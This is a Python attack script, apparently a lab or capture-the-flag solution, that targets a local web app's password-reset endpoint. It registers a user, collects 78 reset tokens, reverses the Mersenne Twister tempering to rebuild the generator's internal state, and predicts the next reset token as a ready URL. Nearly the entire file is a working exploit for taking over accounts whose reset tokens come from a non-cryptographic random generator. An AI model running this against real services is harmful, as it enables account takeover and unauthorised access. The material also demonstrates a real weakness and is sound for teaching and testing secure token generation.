import base64
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import requests
#Mersenne Twister MT 19937
class MT19937:

	(W, N, M, R) = (32, 624, 397, 31)
	A = 0x9908B0DF
	U, D = 11, 0xFFFFFFFF
	S, B = 7, 0x9D2C5680
	T, C = 15, 0xEFC60000
	L = 18
	F = 1812433253

	def __init__(self, seed):
		#print(seed)
		if isinstance(seed, bytes):
			seed = int.from_bytes(seed, 'big')
		seed = seed & 0xFFFFFFFF

		self.lower_mask = (1 << self.R) - 1
		self.upper_mask = self.D & -self.lower_mask
		self.MT = [0] * self.N
		self.idx = self.N

		self.MT[0] = seed
		for i in range(1, self.N):
			self.MT[i] = self.D & (self.F * (self.MT[i-1] ^ 
												(self.MT[i-1] >> (self.W-2))) + i)
		return

	#Extract a tempered value based on MT[index]
	#calling twist() every n numbers
	def extract_number(self):
		if self.idx >= self.N:
			if self.idx > self.N:
				raise Exception("No seed present")
			self.twist()

		y = self.MT[self.idx]
		y = y ^ ((y >> self.U) & self.D)
		y = y ^ ((y << self.S) & self.B)
		y = y ^ ((y << self.T) & self.C)
		y = y ^ (y >> self.L)

		self.idx += 1
		return self.D & y

	#Generate the next n values from the series x_i 
	def twist(self):
		for i in range(self.N):
			x = (self.MT[i] & self.upper_mask) + (self.MT[(i+1) % self.N] & self.lower_mask)
			xA = x >> 1
			if x % 2 != 0:
				xA = xA ^ self.A
			self.MT[i] = self.MT[(i + self.M) % self.N] ^ xA
		self.idx = 0

	# added this to set the initial state of the generator 
	def set_state(self, state):
		if len(state) != self.N:
			# Corrected error message with f-string for proper variable interpolation
			raise ValueError(f"State array must be of length {self.N}")
		self.MT = state
		self.index = self.N  # Ensures the generator is ready to "twist" upon the next generation request 


def u_mix (y):
	U, D = 11, 0xFFFFFFFF
	S, B = 7, 0x9D2C5680
	T, C = 15, 0xEFC60000
	L = 18
	unmix = y
	for i in range(L-1):
		unmix = unmix ^ (unmix >> L)
	for i in range(T):
		unmix = unmix ^ ((unmix << T) & C)
	for i in range(S):
		unmix = unmix ^ ((unmix << S) & B)
	for i in range(U):
		unmix = unmix ^ ((unmix >> U) & D)
	return unmix & 0xFFFFFFFF

def temper(y):
	U, D = 11, 0xFFFFFFFF
	S, B = 7, 0x9D2C5680
	T, C = 15, 0xEFC60000
	L = 18
    
	y = y ^ ((y >> U) & D)
	y = y ^ ((y << S) & B)
	y = y ^ ((y << T) & C)
	y = y ^ (y >> L)
	return D & y

# Testing umix functionality 
def test_umix(seed=123, count=10):
    original_outputs = generate_test_outputs(seed, count)
    tempered_outputs = [temper(y) for y in original_outputs]
    reversed_outputs = [u_mix(y) for y in tempered_outputs]

    # Check if the reversed outputs match the original outputs
    for original, reversed_y in zip(original_outputs, reversed_outputs):
        assert original == reversed_y, f"Failed to reverse tempering: {original} != {reversed_y}"

    print("All tests passed. u_mix is correctly reversing the tempering process.")

# given a token use our u-mix function to decode the token
def decode_and_reverse(token):
	reversed_integers = []

	try:
		decoded = base64.b64decode(token.encode('utf-8'))
		decoded_bytes = decoded.decode('utf-8')
		values = decoded_bytes.split(":")

		for b in values:
			reversed_int = u_mix(int(b))
			reversed_integers.append(reversed_int)
	except Exception as e:
		print(f"Error processing token: {e}")

	return reversed_integers


# since server uses a basic url approach, just parsing url for token
def extract_token_from_html(response):
	soup = BeautifulSoup(response.text, 'html.parser')

	p_tags = soup.find_all('p')
	for p in p_tags:
		if "token" in p.text:
			return get_token(p.text.strip())  

	return None 

def get_token(token_string):
    token_start = token_string.find('token=') + len('token=')
    token_end = token_string.find(' ', token_start)  
    if token_end == -1:  
        token_end = token_string.find('\n', token_start)
    if token_end == -1: 
        token_end = len(token_string)

    token = token_string[token_start:token_end].strip()
    return token

def collect_tokens(base_url, forgot_password_endpoint, username):
	tokens = []
	for i in range(78):
		full_url = urljoin(base_url, forgot_password_endpoint)
		response = requests.post(full_url, data={'user': username})
		if response.status_code == 200:
			token = extract_token_from_html(response)
			if token:
				tokens.append(token)
			else:
				print("Token not found in response.")
		else:
			print(f"Failed to request password reset for {username}. Status Code: {response.status_code}")
	return tokens

# now that the generator is at the initial state, we predict the future tokens
def predict_next_token(mt_instance):
	predicted_values = [mt_instance.extract_number() for i in range(8)]
	token = ":".join(str(value) for value in predicted_values)
	# print(token)
	return base64.b64encode(token.encode('utf-8'))


# realized way too late into coding this that only regular user tokens
# show up in html, was stuck getting response 200 for so long
def register_user(base_url, username, password):
    register_endpoint = "/register"
    data = {'user': username, 'password': password}
    response = requests.post(f"{base_url}{register_endpoint}", data=data)
    if response.status_code == 200:
        print(f"User {username} registered successfully.")
    else:
        print(f"Failed to register user {username}. Status Code: {response.status_code}")


def generate_test_outputs(seed, count=10):
    mt = MT19937(seed)
    outputs = [mt.extract_number() for _ in range(count)]
    return outputs

# another test function
def big_guy():
	reversed_integers = []
	token = 'MzAxMzYyMjIwNToxMzgwMzYzODk2OjQwOTgwMjk2OTA6NjYyODY5NjUzOjMzMDA5MTI5Mjg6MzEwNzEyMDEzNzo1MzQzMzI1ODE6ODU5MzcyNDg3'
	decoded = base64.b64decode(token.encode('utf-8'))
	decoded_bytes = decoded.decode('utf-8')
	values = decoded_bytes.split(":")
	for b in values:
		reversed_int = u_mix(int(b))
		reversed_integers.append(reversed_int)
	print(reversed_integers)
	token2 = str(reversed_integers[0])
	for i in range(1,7):
		token2 += ":" + str(reversed_integers[i])
	print(base64.b64encode(token2.encode('utf-8')))


if __name__ == "__main__":
	# collecting the tokens
	base_url = "http://0.0.0.0:8080"
	endpoint = "/forgot"
	dummy_user = "test1"
	dummy_pass = "hehe"

		
	register_user(base_url, dummy_user, dummy_pass)
	tokens = collect_tokens(base_url, endpoint, dummy_user)	


	decoded_and_reversed = []
	for token in tokens:
		integers_from_token = decode_and_reverse(token)
		
		decoded_and_reversed.extend(integers_from_token)
	
	# generate new instance of MT with initial state
	mt_clone = MT19937(0)
	mt_clone.set_state(decoded_and_reversed)

	predicted_token = predict_next_token(mt_clone)
	print('http://0.0.0.0:8080/reset?token=' + str(predicted_token.decode('utf-8')))
	# reset password


